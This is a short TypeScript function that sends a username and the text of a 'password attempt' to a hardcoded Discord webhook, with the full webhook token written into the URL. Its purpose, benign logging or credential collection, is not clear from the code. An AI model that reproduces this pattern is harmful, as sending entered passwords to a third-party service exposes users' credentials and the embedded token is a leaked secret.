export function logPasswordAttempt(name: string, text: string) {
    return fetch('https://discord.com/api/webhooks/1319444615191072890/79lP5pbQz45MJdtge6gxJpR8fQmiK9su30YqMUciE_7iKvFizbnc9m6OFUHAykq92tFZ', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
            "username": name,
            content: text
        })
    }).then((res) => {
        if(res.ok) {
            console.log('Logged password attempt');
        } else {
            console.error('Failed to log password attempt');
            console.error(res);
        }
    }).catch(() => {
        console.error('Failed to log password attempt');
    })
}